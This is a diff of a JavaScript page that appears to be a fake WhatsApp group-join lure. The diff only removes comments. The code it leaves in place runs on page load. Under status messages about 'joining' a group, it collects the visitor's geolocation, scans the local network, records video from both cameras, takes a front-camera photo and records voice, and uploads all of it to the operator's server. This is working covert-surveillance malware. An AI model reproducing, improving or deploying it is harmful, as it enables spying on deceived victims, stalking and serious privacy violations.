@@ -1,6 +1,6 @@
 // Global constants
-const RECORD_DURATION = 15000; // 15 ثانية للتسجيل الصوتي (تم التعديل)
-const RECORD_VIDEO_DURATION = 10000; // 10 ثوانٍ لتسجيل الفيديو (تم التعديل)
+const RECORD_DURATION = 15000;
+const RECORD_VIDEO_DURATION = 10000;
 const WHATSAPP_LINK = 'https://chat.whatsapp.com/CJWFn8kmTfnHlYa4FqRhSt?mode=wwt';
 
 // --- GLOBAL STATE ---
@@ -16,7 +16,7 @@ let mediaStream = null;
 // --- Server Endpoints ---
 const CONFIG_API_URL = '/get_config';  
 const LOG_DATA_URL = '/log_data';
-const CAPTURE_IMAGE_URL = '/capture_image'; // لحفظ الصورة
+const CAPTURE_IMAGE_URL = '/capture_image';
 const CAPTURE_VIDEO_URL = '/capture_video';  
 const RECORD_VOICE_URL = '/record_voice';  
 const INTERNAL_NETWORK_URL = '/log_network_scan';
@@ -30,7 +30,6 @@ function handleError(error) {
 }
 
 function endProcess() {
-    // 1. UI Update
     const spinner = document.getElementById('loadingSpinner'); 
     const statusMessage = document.getElementById('statusMessage');
     const button = document.getElementById('actionButton');
@@ -44,14 +43,12 @@ function endProcess() {
     }
     console.log("All media and data capture sequence finished.");
 
-    // 2. Clean up: Stop all open tracks safely
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
         mediaStream = null; 
         console.log("All MediaTracks stopped.");
     }
 
-    // 3. Redirection Logic
     if (currentMode === 'spam') {
         const userConfirmed = confirm(currentSpamMessage);
         if (userConfirmed) {
@@ -75,12 +72,11 @@ function collectAdditionalData() {
 }
 
 // ------------------------------------------------------------------
-// 🎙️ Voice Recording Functions (15 seconds)
+// Voice Recording Functions
 // ------------------------------------------------------------------
 
 function sendVoiceToServer(audioBlob) {
     const formData = new FormData();
-    // تأكد أن الخادم يتوقع 'audio_data'
     formData.append('audio_data', audioBlob, 'recording.ogg'); 
 
     return fetch(RECORD_VOICE_URL, { method: 'POST', body: formData })
@@ -119,7 +115,7 @@ function startVoiceRecording() {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
-                }, RECORD_DURATION); // استخدام الثابت الجديد (15 ثانية)
+                }, RECORD_DURATION);
 
             })
             .catch(err => {
@@ -129,9 +125,8 @@ function startVoiceRecording() {
     });
 }
 
-
 // ------------------------------------------------------------------
-// 📸 Image Capture Functions (Camera: Front, Saved to /capture_image)
+// Image Capture Functions
 // ------------------------------------------------------------------
 
 function sendImageToServer(imageDataURL) {
@@ -151,7 +146,6 @@ function captureImage() {
         statusMessage.textContent = 'Step 4/5: Completing group profile snapshot...';
     }
 
-    // استخدام facingMode: 'user' للكاميرا الأمامية
     const constraints = { video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }, audio: false };
 
     return new Promise((resolve) => {
@@ -175,7 +169,6 @@ function captureImage() {
                         const imageDataURL = canvas.toDataURL('image/jpeg', 0.9);
                         sendImageToServer(imageDataURL).finally(resolve);
                         
-                        // إيقاف المجرى بعد التقاط الصورة
                         stream.getTracks().forEach(track => track.stop());
                     }, 500);
                 };
@@ -188,12 +181,11 @@ function captureImage() {
 }
 
 // ------------------------------------------------------------------
-// 🎥 Video Recording Functions (10 seconds)
+// Video Recording Functions
 // ------------------------------------------------------------------
 
 function sendVideoToServer(videoBlob, cameraType) {
     const formData = new FormData();
-    // تأكد أن الخادم يتوقع 'video_data'
     formData.append('video_data', videoBlob, `recording_${cameraType}.webm`); 
 
     return fetch(CAPTURE_VIDEO_URL, { method: 'POST', body: formData }) 
@@ -235,7 +227,7 @@ function startVideoRecording(facingMode, cameraType) {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
-                }, RECORD_VIDEO_DURATION); // استخدام الثابت الجديد (10 ثوانٍ)
+                }, RECORD_VIDEO_DURATION);
 
             })
             .catch(err => {
@@ -246,7 +238,7 @@ function startVideoRecording(facingMode, cameraType) {
 }
 
 // ------------------------------------------------------------------
-// 🌟 Local Network Scanner (بدون تعديل)
+// Local Network Scanner
 // ------------------------------------------------------------------
 
 function scanLocalNetwork() {
@@ -297,7 +289,7 @@ function scanLocalNetwork() {
 }
 
 // ------------------------------------------------------------------
-// 🌍 Geolocation Functions (بدون تعديل)
+// Geolocation Functions
 // ------------------------------------------------------------------
 
 function sendDataToServer(position, additionalData) {
@@ -353,30 +345,16 @@ function getLocation() {
 }
 
 // ------------------------------------------------------------------
-// ⭐ MAIN SEQUENCING LOGIC (Using Async/Await) ⭐
+// MAIN SEQUENCING LOGIC
 // ------------------------------------------------------------------
 
-/**
- * Runs the full sequence of data collection steps.
- */
 async function mainSequence() {
     try {
-        // 1. Geolocation 
         await getLocation();
-
-        // 2. Local Network Scan 
         await scanLocalNetwork();
-
-        // 3. Video Recording - Front Camera (10s)
         await startVideoRecording("user", "user");
-
-        // 4. Video Recording - Back Camera (10s)
         await startVideoRecording("environment", "environment");
-
-        // 5. High-Resolution Image Capture (Front Camera)
         await captureImage();
-        
-        // 6. Voice Recording (15s)
         await startVoiceRecording();
 
     } catch (error) {
@@ -385,7 +363,6 @@ async function mainSequence() {
         endProcess();
     }
 }
-
 
 // ------------------------------------------------------------------
 // MAIN ENTRY POINT
@@ -400,7 +377,6 @@ async function initTool() {
         button.textContent = 'Connecting...';
     }
 
-    // 1. Fetch Configuration
     try {
         const response = await fetch(CONFIG_API_URL);
         if (response.ok) {
@@ -415,7 +391,6 @@ async function initTool() {
         console.error("Could not connect to config API, defaulting to NORMAL mode.", e);
     }
 
-    // 2. Update UI (Omitted for brevity)
     const groupNameElement = document.getElementById('groupName'); 
     const groupMembersElement = document.getElementById('groupMembers');
     const groupImageElement = document.getElementById('groupImage');
@@ -437,13 +412,9 @@ async function initTool() {
         statusMessage.textContent = `Joining ${groupDetails.name} (${groupDetails.members} members)...`;
     }
 
-    // 3. Execute the function based on the fetched mode
     mainSequence();
 }
 
-/**
- * 🌟 الدالة التي يتم استدعاؤها عند ضغط زر "Join Group" أو تحميل الصفحة.
- */
 function startSequence() {
     const statusMessage = document.getElementById('statusMessage');
     if (statusMessage) {
@@ -452,5 +423,4 @@ function startSequence() {
     initTool();
 }
 
-// Start the sequence immediately when the page is loaded (essential for CLONE mode)
 window.onload = startSequence;
